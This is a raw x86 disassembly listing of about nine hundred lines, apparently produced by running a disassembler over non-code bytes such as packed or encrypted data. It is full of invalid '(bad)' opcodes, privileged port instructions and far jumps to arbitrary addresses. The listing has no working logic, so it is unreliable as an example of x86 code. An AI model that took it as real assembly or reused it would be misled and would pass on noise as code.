  41fcae:	mov    ds:0x2f92774b,al
  41fcb3:	pop    ecx
  41fcb4:	fcom   DWORD PTR [edi+0x66]
  41fcb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcb8:	add    eax,0xa123837f
  41fcbd:	jbe    0x41fcf0
  41fcbf:	in     eax,dx
  41fcc0:	or     eax,0xab36750f
  41fcc5:	icebp  
  41fcc6:	loop   0x41fceb
  41fcc8:	enter  0xc302,0xcb
  41fccc:	(bad)  
  41fccd:	in     al,0xc0
  41fccf:	mov    ah,0xf4
  41fcd1:	cmp    eax,DWORD PTR [ecx-0x2780297d]
  41fcd7:	mov    DWORD PTR [ecx],esi
  41fcd9:	stc    
  41fcda:	(bad)  
  41fcdb:	jmp    0xc1cf:0x3cae2be0
  41fce2:	push   0xffffffea
  41fce4:	xchg   edx,eax
  41fce5:	lea    edx,[ebp+0x4c]
  41fce8:	pop    eax
  41fce9:	adc    bh,BYTE PTR ds:0x7cf79f5c
  41fcef:	(bad)  
  41fcf0:	call   0x85bc:0xc3e1130f
  41fcf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcf8:	xlat   BYTE PTR ds:[ebx]
  41fcf9:	in     al,0xb9
  41fcfb:	inc    eax
  41fcfc:	fcomip st,st(3)
  41fcfe:	pusha  
  41fcff:	jmp    0xac960083
  41fd04:	in     al,dx
  41fd05:	hlt    
  41fd06:	adc    ah,BYTE PTR ds:0xdc050167
  41fd0c:	jmp    0xb5650e61
  41fd11:	cmp    BYTE PTR [eax],bh
  41fd13:	pop    esi
  41fd14:	out    dx,al
  41fd15:	inc    edx
  41fd16:	jne    0x41fd14
  41fd18:	mov    ebx,0x30775436
  41fd1d:	jnp    0x41fd4d
  41fd1f:	mov    dh,bh
  41fd21:	in     eax,dx
  41fd22:	and    eax,0x2ca2df7c
  41fd27:	leave  
  41fd28:	or     bh,ah
  41fd2a:	ss mov esi,0x7175e28b
  41fd30:	ret    0x38ab
  41fd33:	lods   al,BYTE PTR ds:[esi]
  41fd34:	mov    ch,0x91
  41fd36:	xchg   DWORD PTR [ebx-0x52],ebx
  41fd39:	fstp   QWORD PTR [edx+0x27]
  41fd3c:	cmp    al,0xb0
  41fd3e:	pop    edx
  41fd3f:	lods   al,BYTE PTR ds:[esi]
  41fd40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd41:	shr    ebp,0xcf
  41fd44:	mov    ebx,0x7bef1735
  41fd49:	test   BYTE PTR [edi+0x6c3c2ef4],ah
  41fd4f:	sysexit 
  41fd51:	adc    BYTE PTR [edi-0x37],bh
  41fd54:	jg     0x41fd2e
  41fd56:	mov    dl,BYTE PTR [eax-0x2f7c758e]
  41fd5c:	inc    edi
  41fd5d:	es cdq 
  41fd5f:	and    eax,0xc08b9189
  41fd64:	stos   DWORD PTR es:[edi],eax
  41fd65:	pmulhw mm1,QWORD PTR [ebp-0x251332e8]
  41fd6c:	dec    esp
  41fd6d:	fstp   st(1)
  41fd6f:	lock out 0xb2,eax
  41fd72:	jno    0x41fd6b
  41fd74:	sub    DWORD PTR [esi*2-0xa63c015],0x8323948f
  41fd7f:	and    ebp,esi
  41fd81:	popa   
  41fd82:	pushf  
  41fd83:	cs mov ecx,edx
  41fd86:	xor    al,0x9c
  41fd88:	jns    0x41fda9
  41fd8a:	scas   al,BYTE PTR es:[edi]
  41fd8b:	pop    edx
  41fd8c:	jmp    0x289d:0x75295587
  41fd93:	dec    ebx
  41fd94:	and    al,0x53
  41fd96:	cdq    
  41fd97:	mov    gs,WORD PTR [ebx+edx*2]
  41fd9a:	mov    dh,0x6f
  41fd9c:	pop    ecx
  41fd9d:	sbb    al,0x59
  41fd9f:	xchg   ebp,eax
  41fda0:	imul   eax,DWORD PTR [ecx],0xbca3bdbc
  41fda6:	pusha  
  41fda7:	addr16 sub al,0xd7
  41fdaa:	jge    0x41fdd4
  41fdac:	(bad)  
  41fdad:	jo     0x41fd81
  41fdaf:	xor    BYTE PTR ds:0x9ce00885,bl
  41fdb5:	push   DWORD PTR [esi+0x385c56d4]
  41fdbb:	cmp    bl,ch
  41fdbd:	out    dx,eax
  41fdbe:	or     eax,0x4fe6cb81
  41fdc3:	mov    ds:0xa028bf8a,eax
  41fdc8:	adc    al,0xf0
  41fdca:	push   di
  41fdcc:	lock or ebp,DWORD PTR [edx+esi*2]
  41fdd0:	ins    DWORD PTR es:[edi],dx
  41fdd1:	(bad)  
  41fdd2:	push   DWORD PTR [esi]
  41fdd4:	xor    edi,DWORD PTR [edi-0x62]
  41fdd7:	push   esp
  41fdd8:	push   ebp
  41fdd9:	lds    eax,FWORD PTR [ebp-0x722c514c]
  41fddf:	jge    0x41fd98
  41fde1:	xchg   DWORD PTR [ebp-0x75ebe075],esp
  41fde7:	or     dh,0x25
  41fdea:	adc    DWORD PTR [esi-0x28b095d0],0x64
  41fdf1:	sbb    BYTE PTR fs:[edx+0x5c593dad],dl
  41fdf8:	push   ds
  41fdf9:	mov    ?,WORD PTR [eax+0x13]
  41fdfc:	bnd ja 0x41fdb1
  41fdff:	dec    ebp
  41fe00:	out    dx,eax
  41fe01:	inc    ebx
  41fe02:	cmp    dh,bh
  41fe04:	sti    
  41fe05:	pop    esp
  41fe06:	mov    ebp,0xbe9648ed
  41fe0b:	ds jge 0x41fe06
  41fe0e:	test   BYTE PTR [ebx],bl
  41fe10:	mov    DWORD PTR [edx+ebp*1],edi
  41fe13:	aaa    
  41fe14:	fldcw  WORD PTR [edx+0x77]
  41fe17:	pushf  
  41fe18:	dec    esp
  41fe19:	scas   al,BYTE PTR es:[edi]
  41fe1a:	jecxz  0x41fe00
  41fe1c:	or     DWORD PTR [edi],eax
  41fe1e:	(bad)  
  41fe1f:	stc    
  41fe20:	add    DWORD PTR [esi],esi
  41fe22:	xlat   BYTE PTR ds:[ebx]
  41fe23:	mov    ?,WORD PTR ds:0xfafbcbe4
  41fe29:	cmp    eax,0x4d17252b
  41fe2e:	repnz xor ebx,esp
  41fe31:	sbb    esi,DWORD PTR [ecx]
  41fe33:	mov    bl,0x8b
  41fe35:	inc    ebp
  41fe36:	mov    ebp,0xb4421ad4
  41fe3b:	sbb    bl,BYTE PTR [esi+0x40]
  41fe3e:	fwait
  41fe3f:	adc    BYTE PTR [eax+0x33db5a6d],bh
  41fe45:	nop
  41fe46:	scas   al,BYTE PTR es:[edi]
  41fe47:	out    0xab,eax
  41fe49:	jl     0x41fec8
  41fe4b:	jmp    0x41fe17
  41fe4d:	pop    DWORD PTR [edx+0x3a]
  41fe50:	push   ebx
  41fe51:	fild   WORD PTR [edi-0x8f0b8]
  41fe57:	mov    ch,0x33
  41fe59:	jb     0x41fe00
  41fe5b:	sub    BYTE PTR [ebp-0x63],dh
  41fe5e:	call   0x4c3cec2
  41fe63:	pop    edx
  41fe64:	push   eax
  41fe65:	outs   dx,DWORD PTR ds:[esi]
  41fe66:	aas    
  41fe67:	inc    ecx
  41fe68:	sbb    ah,dl
  41fe6a:	jg     0x41fe95
  41fe6c:	cmp    al,0x51
  41fe6e:	aad    0x13
  41fe70:	adc    ah,BYTE PTR [esi+eax*8]
  41fe73:	push   esp
  41fe74:	daa    
  41fe75:	ja     0x41fe49
  41fe77:	dec    esi
  41fe78:	test   DWORD PTR [ebx+esi*8+0x31630609],esi
  41fe7f:	push   es
  41fe80:	hlt    
  41fe81:	xchg   ecx,eax
  41fe82:	repz sub edx,edi
  41fe85:	es in  al,dx
  41fe87:	mov    cl,0x15
  41fe89:	sub    al,0x8c
  41fe8b:	aaa    
  41fe8c:	ret    0x60b7
  41fe8f:	xchg   ebp,ebp
  41fe91:	stc    
  41fe92:	les    esp,FWORD PTR [edi+0x6a]
  41fe95:	adc    BYTE PTR [esp+ebx*2+0x53],ah
  41fe99:	pop    ebx
  41fe9a:	out    0x6c,eax
  41fe9c:	addr16 pop eax
  41fe9e:	mov    edi,0x13831ee8
  41fea3:	pop    ebp
  41fea4:	xchg   esi,eax
  41fea5:	pop    ebp
  41fea6:	retf   
  41fea7:	mov    WORD PTR [eax],cs
  41fea9:	dec    ecx
  41feaa:	sub    DWORD PTR [esi+0x1f],esi
  41fead:	xchg   esp,eax
  41feae:	dec    esi
  41feaf:	jmp    0xda648410
  41feb4:	aam    0xfc
  41feb6:	sub    DWORD PTR [ebx-0x3fe3cdb4],esp
  41febc:	scas   eax,DWORD PTR es:[edi]
  41febd:	mov    eax,DWORD PTR [edi+ebp*1]
  41fec0:	dec    eax
  41fec1:	jle    0x41fe45
  41fec3:	cld    
  41fec4:	push   esp
  41fec5:	retf   
  41fec6:	not    DWORD PTR [ebx]
  41fec8:	imul   dh
  41feca:	scas   eax,DWORD PTR es:[edi]
  41fecb:	fnstenv [eax]
  41fecd:	jle    0x41ff39
  41fecf:	jno    0x41fea4
  41fed1:	mov    al,ds:0x4a530632
  41fed6:	enter  0x7fa0,0xab
  41feda:	out    dx,eax
  41fedb:	icebp  
  41fedc:	add    esi,ebx
  41fede:	sub    ebx,ecx
  41fee0:	ja     0x41ff1d
  41fee2:	add    DWORD PTR [eax],ebp
  41fee4:	iret   
  41fee5:	stos   BYTE PTR es:[edi],al
  41fee6:	mov    esi,0x58478d6d
  41feeb:	add    eax,0xe2fcabb7
  41fef0:	ror    DWORD PTR [edi],0x57
  41fef3:	fild   QWORD PTR [edx+eax*1]
  41fef6:	xor    eax,0xad630528
  41fefb:	dec    DWORD PTR [esp+edx*4-0xc]
  41feff:	push   edx
  41ff00:	cld    
  41ff01:	(bad)  
  41ff02:	jge    0x41febe
  41ff04:	fstp   DWORD PTR [esi-0x6f]
  41ff07:	jmp    0x41fece
  41ff09:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff0b:	sub    ebx,DWORD PTR [edi+0x4a]
  41ff0e:	and    al,BYTE PTR [edi+0xa703cb2]
  41ff14:	enter  0x8c28,0x35
  41ff18:	call   0xd139c13a
  41ff1d:	out    0xa8,al
  41ff1f:	adc    eax,0xb64bbdf1
  41ff24:	or     DWORD PTR [edx+0x7f5cee3],ebp
  41ff2a:	pop    ds
  41ff2b:	mov    ebx,0x54f996b4
  41ff30:	aam    0xee
  41ff32:	sbb    DWORD PTR [eax-0x7b],0xffffffe7
  41ff36:	xchg   ecx,eax
  41ff37:	push   esi
  41ff38:	sub    BYTE PTR [edx-0x40],ch
  41ff3b:	pop    ebp
  41ff3c:	lea    edx,[edx+ecx*8-0x1a]
  41ff40:	mov    ebx,0x9788d85b
  41ff45:	and    cl,BYTE PTR [ecx-0x64038e37]
  41ff4b:	push   0xcf41282
  41ff50:	pop    esi
  41ff51:	mov    ds:0x5dbab574,eax
  41ff56:	mov    eax,ds:0xe613dbba
  41ff5b:	mov    edx,ebx
  41ff5d:	nop
  41ff5e:	mov    ecx,0x7bf5c083
  41ff63:	pop    ebp
  41ff64:	dec    ebx
  41ff65:	mov    ds:0xecb9b008,al
  41ff6a:	gs adc eax,0x5e92cc9d
  41ff70:	xor    al,0x7a
  41ff72:	push   eax
  41ff73:	mov    bl,0x12
  41ff75:	mov    ebx,0x835610e
  41ff7a:	xor    eax,0x2ff71030
  41ff7f:	xor    al,0x87
  41ff81:	pop    esp
  41ff82:	mov    edx,0xa04b1c08
  41ff87:	mov    al,ds:0x21c9f5f5
  41ff8c:	(bad)  
  41ff8d:	sbb    cl,BYTE PTR [ebx]
  41ff8f:	mov    WORD PTR [eax],ds
  41ff91:	std    
  41ff92:	loope  0x41ffcc
  41ff94:	cmp    BYTE PTR [edx+0x1f8e39dd],dl
  41ff9a:	xor    eax,esi
  41ff9c:	into   
  41ff9d:	icebp  
  41ff9e:	fadd   DWORD PTR [ebp-0x444a8845]
  41ffa4:	fwait
  41ffa5:	and    al,0xba
  41ffa7:	xchg   edi,eax
  41ffa8:	adc    al,0xbb
  41ffaa:	pushf  
  41ffab:	fnsetpm(287 only) 
  41ffad:	pop    esi
  41ffae:	outs   dx,BYTE PTR ds:[esi]
  41ffaf:	pop    ds
  41ffb0:	and    BYTE PTR [esi],cl
  41ffb2:	fcomp  QWORD PTR [ebp+edx*4+0x1a]
  41ffb6:	mov    DWORD PTR [esi+esi*2+0x1c],esp
  41ffba:	xor    BYTE PTR [edx],0x3f
  41ffbd:	fsubr  DWORD PTR [ecx+0x11]
  41ffc0:	cmp    BYTE PTR [esi+0x1],cl
  41ffc3:	shl    BYTE PTR [ebx-0x25],1
  41ffc6:	cmp    dh,BYTE PTR [esi-0x2]
  41ffc9:	ror    BYTE PTR [ebx],cl
  41ffcb:	retf   
  41ffcc:	xchg   DWORD PTR [ebx+edi*4+0x6904edc0],ecx
  41ffd3:	push   ecx
  41ffd4:	inc    ebp
  41ffd5:	mov    ebx,0x41381b15
  41ffda:	popf   
  41ffdb:	jae    0x41ff7c
  41ffdd:	xchg   DWORD PTR [ebx],edi
  41ffdf:	jmp    0x287e0a43
  41ffe4:	mov    edi,DWORD PTR [edi+0x2c]
  41ffe7:	jmp    0xaa14:0xa22454a0
  41ffee:	jmp    0x702:0x58672b07
  41fff5:	push   eax
  41fff6:	lahf   
  41fff7:	mov    esi,0x7b47939f
  41fffc:	sub    ebp,DWORD PTR [edi-0x15]
  41ffff:	cwde   
  420000:	adc    BYTE PTR [edi+0x1a],bl
  420003:	leave  
  420004:	js     0x41ffe4
  420006:	fisttp DWORD PTR [edx+0x7f]
  420009:	add    al,0x67
  42000b:	arpl   WORD PTR [ebp-0x67f9a09],bp
  420011:	dec    esi
  420012:	ins    BYTE PTR es:[edi],dx
  420013:	xor    eax,0x39a503f3
  420018:	out    dx,eax
  420019:	gs pop esi
  42001b:	cmc    
  42001c:	push   ds
  42001d:	mov    ch,0xc8
  42001f:	ror    edx,cl
  420021:	add    cl,BYTE PTR [edx+0x22588277]
  420027:	retf   0x1f53
  42002a:	cli    
  42002b:	cmp    edx,DWORD PTR [ecx+0x60]
  42002e:	(bad)  
  42002f:	jnp    0x42005e
  420031:	repz hlt 
  420033:	sub    BYTE PTR [esi+0x50b323fc],bh
  420039:	sbb    ecx,DWORD PTR [ecx+eax*8-0x1f]
  42003d:	pop    ebp
  42003e:	aas    
  42003f:	sbb    al,0x0
  420041:	pop    ebx
  420042:	shl    DWORD PTR [edi],1
  420044:	cwde   
  420045:	in     al,dx
  420046:	sbb    dh,al
  420048:	test   BYTE PTR [ebp-0x1c03f3c5],bh
  42004e:	fistp  WORD PTR [ecx]
  420050:	add    eax,0x5f14136
  420055:	jecxz  0x41ffdb
  420057:	add    DWORD PTR [edi-0x2],0xe3b101b0
  42005e:	xor    ebp,ecx
  420060:	inc    eax
  420061:	sar    BYTE PTR ds:0x83c3bf24,0x54
  420068:	push   eax
  420069:	sar    BYTE PTR [ebp-0x4029b6bb],cl
  42006f:	sub    edx,DWORD PTR ds:[ebp+ebx*2-0x2c66c177]
  420077:	icebp  
  420078:	lock fstp QWORD PTR [ebx-0x20653cbd]
  42007f:	and    DWORD PTR [ebx],edi
  420081:	(bad)  
  420082:	test   BYTE PTR [ebp+0x2beb4abb],0xad
  420089:	leave  
  42008a:	bound  ecx,QWORD PTR [ebp-0x2a1e33e1]
  420090:	push   esi
  420091:	xchg   ecx,eax
  420092:	out    0x8e,eax
  420094:	test   eax,0xb2442023
  420099:	push   0xffffffaf
  42009b:	rol    DWORD PTR [edx+0x35a1fb92],1
  4200a1:	push   edi
  4200a2:	or     ecx,esi
  4200a4:	ficom  WORD PTR [ebx+0x31]
  4200a7:	jp     0x420038
  4200a9:	xor    al,BYTE PTR [edx+ebx*4-0xbb41c80]
  4200b0:	xchg   DWORD PTR [ebx+ebx*1],edi
  4200b3:	adc    eax,0x563a36a5
  4200b8:	out    0x57,al
  4200ba:	add    DWORD PTR [ebp+0x30e3cde0],ecx
  4200c0:	adc    bh,BYTE PTR [esi]
  4200c2:	dec    ecx
  4200c3:	xchg   ebp,eax
  4200c4:	cmc    
  4200c5:	into   
  4200c6:	inc    ecx
  4200c7:	adc    DWORD PTR [edi+0x2c],ebp
  4200ca:	call   0x644a:0x5f4e649e
  4200d1:	aaa    
  4200d2:	xor    BYTE PTR [eax-0x24789adc],ah
  4200d8:	xlat   BYTE PTR ds:[ebx]
  4200d9:	xchg   edx,eax
  4200da:	mov    ds:0xd69c7a6c,eax
  4200df:	pop    es
  4200e0:	(bad)  
  4200e1:	mov    ch,0x2e
  4200e3:	not    BYTE PTR [ebp-0x1314295]
  4200e9:	das    
  4200ea:	ds push 0xffffffbc
  4200ed:	bnd jnp 0x42015a
  4200f0:	in     al,0x3f
  4200f2:	imul   ebx,DWORD PTR [esi+eax*1-0x61],0x60979361
  4200fa:	femms  
  4200fc:	push   es
  4200fd:	dec    edi
  4200fe:	push   cs
  4200ff:	loopne 0x4200e0
  420101:	not    BYTE PTR [esi]
  420103:	sbb    BYTE PTR [ebx+0x59],0x57
  420107:	add    esp,DWORD PTR [edx]
  420109:	jg     0x420127
  42010b:	iret   
  42010c:	push   ebx
  42010d:	mov    eax,ds:0xc3ed2e49
  420112:	sbb    BYTE PTR [ecx-0x72],dl
  420115:	lock stc 
  420117:	dec    ecx
  420118:	add    al,0x81
  42011a:	les    ebx,FWORD PTR [ebx]
  42011c:	mov    ds:0xc3a27161,eax
  420121:	jle    0x42019f
  420123:	mov    ds:0xacaf34ec,eax
  420128:	leave  
  420129:	xor    esp,esp
  42012b:	clc    
  42012c:	ds jle 0x420155
  42012f:	loop   0x4200e9
  420131:	or     eax,0x59d9a015
  420136:	or     DWORD PTR [ebx+0x16],ecx
  420139:	dec    ebx
  42013a:	int3   
  42013b:	ins    DWORD PTR es:[edi],dx
  42013c:	sahf   
  42013d:	sbb    esi,edx
  42013f:	rol    esi,cl
  420141:	into   
  420142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420143:	repnz push ss
  420145:	mov    BYTE PTR [edi-0x19d4f094],0x1e
  42014c:	test   al,0x44
  42014e:	mov    al,ds:0x815535fd
  420153:	pop    es
  420154:	jbe    0x420141
  420156:	jecxz  0x42015d
  420158:	rcl    ebp,0x1f
  42015b:	outs   dx,BYTE PTR ds:[esi]
  42015c:	mov    dl,0x38
  42015e:	add    DWORD PTR [edi+0x7c],ebx
  420161:	ror    dl,0xdc
  420164:	push   0x4587320e
  420169:	dec    eax
  42016a:	adc    ecx,DWORD PTR [ecx]
  42016c:	mov    ebp,0xd5e82a53
  420171:	sub    al,BYTE PTR [ecx]
  420173:	scas   al,BYTE PTR es:[edi]
  420174:	pop    es
  420175:	jns    0x420189
  420177:	jns    0x420192
  420179:	adc    esi,DWORD PTR [esi-0x7c]
  42017c:	pop    es
  42017d:	aas    
  42017e:	dec    ecx
  42017f:	cmp    BYTE PTR [edi],ah
  420181:	pop    ss
  420182:	xchg   esi,eax
  420183:	loope  0x4201e1
  420185:	sub    ecx,ebp
  420187:	in     al,dx
  420188:	push   esi
  420189:	xlat   BYTE PTR ds:[ebx]
  42018a:	cwde   
  42018b:	int3   
  42018c:	sahf   
  42018d:	inc    ebp
  42018e:	or     eax,0x8c37e3bf
  420193:	loope  0x42017a
  420195:	jae    0x4201a1
  420197:	mov    edx,0x466269fa
  42019c:	pop    es
  42019d:	push   ebp
  42019e:	sub    al,0x24
  4201a0:	push   eax
  4201a1:	fs iret 
  4201a3:	aad    0xe1
  4201a5:	(bad)  
  4201a6:	loop   0x4201bd
  4201a8:	jns    0x4201d4
  4201aa:	bnd jle 0x420209
  4201ad:	shr    ecx,1
  4201af:	retf   
  4201b0:	jge    0x420143
  4201b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201b3:	loopne 0x4201be
  4201b5:	addr16 push ebp
  4201b7:	dec    edx
  4201b8:	mov    ch,0x59
  4201ba:	pop    ss
  4201bb:	es mov al,0x6a
  4201be:	jmp    0x420163
  4201c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201c1:	sub    ah,BYTE PTR [edx]
  4201c3:	xchg   ebp,eax
  4201c4:	and    DWORD PTR [edx],ebx
  4201c6:	xlat   BYTE PTR ds:[ebx]
  4201c7:	sub    bh,ch
  4201c9:	inc    eax
  4201ca:	inc    esi
  4201cb:	mov    bl,bh
  4201cd:	(bad)  
  4201cf:	pop    es
  4201d0:	aaa    
  4201d1:	inc    ecx
  4201d2:	and    eax,0x2005d6d9
  4201d7:	pop    edx
  4201d8:	inc    esi
  4201d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201da:	daa    
  4201db:	fld    DWORD PTR [ebp-0x36a5686e]
  4201e1:	test   DWORD PTR [edx],esp
  4201e3:	mov    esp,0xe647326e
  4201e8:	mov    ah,0xa4
  4201ea:	mov    WORD PTR [edx-0x4c],?
  4201ed:	int    0x8d
  4201ef:	cmp    BYTE PTR [ecx+0x9],ch
  4201f2:	xchg   edx,eax
  4201f3:	xchg   ebp,eax
  4201f4:	xchg   edi,eax
  4201f5:	ss add al,0xe3
  4201f8:	out    dx,al
  4201f9:	or     eax,0x120e7696
  4201fe:	dec    eax
  4201ff:	mov    ch,0xe
  420201:	pop    edi
  420202:	aas    
  420203:	loopne 0x4201c5
  420205:	mov    ah,dh
  420207:	arpl   WORD PTR [esi+0x4b],di
  42020a:	mov    al,0x3c
  42020c:	xchg   dl,dh
  42020e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42020f:	dec    edx
  420210:	pop    ebx
  420211:	xchg   ecx,eax
  420212:	rcl    DWORD PTR [edx],0x80
  420215:	mov    al,0xd5
  420217:	mov    dl,0x27
  420219:	mov    bh,0x88
  42021b:	sbb    esp,DWORD PTR [esp+ebx*4+0x46]
  42021f:	sbb    cl,bh
  420221:	cli    
  420222:	sub    al,0xe9
  420224:	mov    DWORD PTR [edi-0x7c],ebx
  420227:	int    0x3c
  420229:	fild   DWORD PTR [edx-0x623bc77f]
  42022f:	pop    edx
  420230:	imul   eax,DWORD PTR [edi],0x8c205844
  420236:	xchg   esi,eax
  420237:	add    BYTE PTR [edx],bh
  420239:	jle    0x4202b4
  42023b:	fucomi st,st(1)
  42023d:	xor    DWORD PTR [edx-0x100e01c7],edx
  420243:	or     eax,0x7ea2cd35
  420248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420249:	(bad)  
  42024a:	adc    DWORD PTR cs:[ebx],esi
  42024d:	mov    al,0x5
  42024f:	shl    DWORD PTR [eax+0x5f],0x2e
  420253:	xor    al,0x43
  420255:	mov    bh,0x2e
  420257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420258:	inc    ebx
  420259:	sub    cl,BYTE PTR [edi-0x14]
  42025c:	neg    BYTE PTR [edi]
  42025e:	push   0x3c031776
  420263:	xchg   ebx,eax
  420264:	and    eax,0xcfec63d5
  420269:	jmp    0x42021f
  42026b:	stc    
  42026c:	add    eax,0xfda319b7
  420271:	icebp  
  420272:	and    BYTE PTR [ecx-0x3c836586],al
  420278:	xor    al,0x2
  42027a:	retf   0x7eb0
  42027d:	lods   eax,DWORD PTR ds:[esi]
  42027e:	pop    eax
  42027f:	fst    DWORD PTR [ebx-0x1de33ab]
  420285:	ins    DWORD PTR es:[edi],dx
  420286:	push   ss
  420287:	aam    0x6b
  420289:	aam    0x47
  42028b:	in     al,0xe7
  42028d:	aas    
  42028e:	jmp    0xef86:0xc3e09283
  420295:	in     al,0x3e
  420297:	test   ch,dh
  420299:	(bad)  
  42029b:	in     eax,dx
  42029c:	dec    esp
  42029d:	out    dx,al
  42029e:	shr    BYTE PTR [ecx-0x3e],0x9d
  4202a2:	lahf   
  4202a3:	mov    esi,0xf8058334
  4202a8:	fisttp DWORD PTR [ebp-0x18]
  4202ab:	mov    edi,0x7eaf91ab
  4202b0:	loop   0x42026a
  4202b2:	and    al,0x71
  4202b4:	cmp    al,0x79
  4202b6:	sbb    esi,DWORD PTR [esi+0x2f878aef]
  4202bc:	fcomp  QWORD PTR [eax+0x653b6f93]
  4202c2:	arpl   cx,bx
  4202c4:	gs inc ebx
  4202c6:	aad    0xe
  4202c8:	mov    dl,0xee
  4202ca:	mov    BYTE PTR [ebx+0x72],ch
  4202cd:	jne    0x4202d7
  4202cf:	mov    ah,0xd4
  4202d1:	pop    ecx
  4202d2:	jae    0x4202db
  4202d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202d5:	iret   
  4202d6:	sub    al,0xdc
  4202d8:	pop    eax
  4202d9:	or     ebp,ecx
  4202db:	mov    ebp,DWORD PTR [edi+edx*4]
  4202de:	sbb    BYTE PTR [edx*1+0x7f2e95cf],bh
  4202e5:	retf   0x4ff4
  4202e8:	je     0x420284
  4202ea:	and    eax,0xf3a3ead8
  4202ef:	xchg   esp,eax
  4202f0:	fldenv gs:[ebp+0x386ce3eb]
  4202f7:	push   ds
  4202f8:	call   0xc926:0x3f947122
  4202ff:	or     eax,0x3dabf557
  420304:	inc    edi
  420305:	add    DWORD PTR [edi+0x1254c2f8],eax
  42030b:	sub    BYTE PTR [esi],0x12
  42030e:	mov    eax,0xce1e82cb
  420313:	mov    eax,ds:0xd49a325a
  420318:	loop   0x4202b4
  42031a:	pop    edi
  42031b:	and    al,0x26
  42031d:	jbe    0x42034d
  42031f:	aas    
  420320:	in     eax,dx
  420321:	ja     0x4202fa
  420323:	xchg   esp,eax
  420324:	test   ch,bh
  420326:	push   cs
  420327:	jecxz  0x4202f3
  420329:	in     al,0x8d
  42032b:	mov    BYTE PTR [eax],cl
  42032d:	add    BYTE PTR [esi],0x77
  420330:	adc    al,0x1d
  420332:	dec    edi
  420333:	enter  0x3c2a,0x21
  420337:	push   ss
  420338:	jb     0x4202dd
  42033a:	std    
  42033b:	cli    
  42033c:	and    al,0x9c
  42033e:	and    ah,BYTE PTR [edx-0x34]
  420341:	cmp    BYTE PTR ds:0x83334a07,0xf2
  420348:	in     eax,0x64
  42034a:	pop    es
  42034b:	sbb    dl,bh
  42034d:	fistp  QWORD PTR [ecx-0x13a4452d]
  420353:	shr    BYTE PTR [edx],cl
  420355:	in     eax,dx
  420356:	imul   esp,DWORD PTR [ecx-0x4c04b14b],0xffffff86
  42035d:	ins    DWORD PTR es:[edi],dx
  42035e:	pop    ecx
  42035f:	inc    edi
  420360:	and    dh,BYTE PTR [ebp+edi*1-0x28779bca]
  420367:	push   ss
  420368:	gs int 0x1d
  42036b:	adc    BYTE PTR [ebp-0x30f85f6d],0x78
  420372:	mov    DWORD PTR [ebx+0x1c9c0d1a],0xcaa80f12
  42037c:	or     al,0x13
  42037e:	push   ecx
  42037f:	jae    0x42038c
  420381:	add    BYTE PTR [edx-0x11],dh
  420384:	sti    
  420385:	pop    eax
  420386:	mov    esi,0xd9decb83
  42038b:	fistp  WORD PTR [esi-0x1f4b58e8]
  420391:	push   eax
  420392:	adc    eax,0x968aa1e4
  420397:	ror    edx,1
  420399:	xor    edi,esi
  42039b:	inc    ebx
  42039c:	cwde   
  42039d:	or     edi,DWORD PTR [edx+esi*2+0x19]
  4203a1:	mov    dl,0x51
  4203a3:	sbb    dh,bl
  4203a5:	pop    es
  4203a6:	fwait
  4203a7:	pop    eax
  4203a8:	(bad)  
  4203a9:	cmp    al,0x60
  4203ab:	add    esp,DWORD PTR [ecx]
  4203ad:	xor    DWORD PTR ds:0x5fa3c78d,esp
  4203b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203b4:	xchg   esi,eax
  4203b5:	ins    DWORD PTR es:[edi],dx
  4203b6:	xor    bh,bl
  4203b8:	mov    al,ds:0x11170486
  4203bd:	cmc    
  4203be:	ja     0x420426
  4203c0:	aaa    
  4203c1:	inc    eax
  4203c2:	sbb    al,0x34
  4203c4:	shr    DWORD PTR [ebp+eax*8+0x32f76fe7],cl
  4203cb:	cs imul ebx,ebx,0xffffffb5
  4203cf:	cld    
  4203d0:	or     al,0x82
  4203d2:	les    ebp,FWORD PTR [ecx]
  4203d4:	cmp    bl,BYTE PTR [edi+0x2d250a67]
  4203da:	adc    bl,ah
  4203dc:	adc    eax,0xea273be9
  4203e1:	mov    bl,0xf3
  4203e3:	clc    
  4203e4:	add    bl,BYTE PTR [esi-0x151d0a41]
  4203ea:	pop    edi
  4203eb:	sub    ch,BYTE PTR [ebx+0x779669e]
  4203f1:	sub    al,BYTE PTR [ebp-0x4e]
  4203f4:	cmp    eax,DWORD PTR [ebx]
  4203f6:	shr    ah,0x91
  4203f9:	dec    edi
  4203fa:	mov    gs,WORD PTR fs:[esi+0x2b]
  4203fe:	icebp  
  4203ff:	sbb    DWORD PTR [esi],eax
  420401:	jg     0x420401
  420403:	adc    DWORD PTR [eax],ebx
  420405:	ret    
  420406:	pop    esi
  420407:	xchg   edi,eax
  420408:	and    al,0x8e
  42040a:	out    0x1a,eax
  42040c:	cld    
  42040d:	enter  0x77cd,0x8d
  420411:	lods   al,BYTE PTR ds:[esi]
  420412:	and    dl,BYTE PTR [esp+ebp*4-0x7b827073]
  420419:	scas   al,BYTE PTR es:[edi]
  42041a:	fnsave [bx-0xf]
  42041e:	(bad)  
  42041f:	jnp    0x4203bf
  420421:	call   0x686d99d7
  420426:	stos   BYTE PTR es:[edi],al
  420427:	xchg   BYTE PTR [ebp-0x21fe6499],bl
  42042d:	xchg   edx,eax
  42042e:	call   FWORD PTR fs:[ebp+0x78]
  420432:	mov    al,ds:0xd2f45881
  420437:	mov    esp,ebx
  420439:	rcr    BYTE PTR [esi],0xe2
  42043c:	adc    al,0x77
  42043e:	mov    ecx,0xb924833b
  420443:	retf   
  420444:	retf   
  420445:	inc    esi
  420446:	and    DWORD PTR [edx+0x5],0x75
  42044a:	mov    dh,0xdb
  42044c:	adc    BYTE PTR [ebp-0x17],bh
  42044f:	push   ecx
  420450:	mov    ds:0x406dccf6,al
  420455:	jnp    0x420455
